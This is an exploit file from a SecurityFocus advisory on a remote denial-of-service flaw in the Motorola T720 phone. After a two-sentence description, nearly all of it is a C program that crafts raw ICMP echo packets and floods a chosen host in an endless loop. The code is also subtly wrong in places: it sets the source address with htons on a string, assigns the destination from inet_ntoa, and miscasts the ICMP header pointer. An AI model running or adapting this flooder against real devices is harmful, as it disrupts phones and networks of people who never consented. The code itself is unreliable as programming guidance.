// source: https://www.securityfocus.com/bid/9779/info

The Motorola T720 has been reported prone to a remote denial of service vulnerability. The issue presents itself when the phone handles excessive IP based traffic under certain circumstances.

An attacker may potentially exploit this issue to cause a target phone to crash.

#include <stdio.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <netdb.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>

int main(int argc, char *argv[]) {
        if(argc < 2) {
                printf("Usage: %s <host>\n", argv[0]);
                exit(0);
        }

        int sock;
        char packet[5000];
        int on = 1;
        struct sockaddr_in dest;
        struct hostent *host;
        struct iphdr *ip = (struct iphdr *) packet;
        struct icmphdr *icmp = (struct icmp *) packet
+ sizeof(struct iphdr);
        if((host = gethostbyname(argv[1])) == NULL) {
                printf("Couldn't resolve host!\n");
                exit(-1);
        }

        if((sock = socket(AF_INET, SOCK_RAW,
IPPROTO_ICMP)) == -1) {
                printf("Couldn't make socket!\n");
                printf("You must be root to create a
raw socket.\n");
                exit(-1);
        }

        if((setsockopt(sock, IPPROTO_IP, IP_HDRINCL,
(char *)&on, sizeof(on))) < 0) {
        perror("setsockopt");
        exit(1);
        }

        dest.sin_family = AF_INET;
        dest.sin_addr = *((struct in_addr
*)host->h_addr);
        ip->ihl = 5;
        ip->id = htons(1337);
        ip->ttl = 255;
        ip->tos = 0;
        ip->protocol = IPPROTO_ICMP;
        ip->version = 4;
        ip->frag_off = 0;
        ip->saddr = htons("1.3.3.7");
        ip->daddr = inet_ntoa(dest.sin_addr);
        ip->tot_len = sizeof(struct iphdr) +
sizeof(struct icmphdr);
        ip->check = 0;
        icmp->checksum = 0;
        icmp->type = ICMP_ECHO;
        icmp->code = 0;
        printf("Ping flooding %s!\n", argv[1]);

        /* begin flooding here. */
        while(1) {
                sendto(sock, packet, ip->tot_len, 0,
(struct sockaddr *)&dest, sizeof(struct sockaddr));
        }
        return(0);
}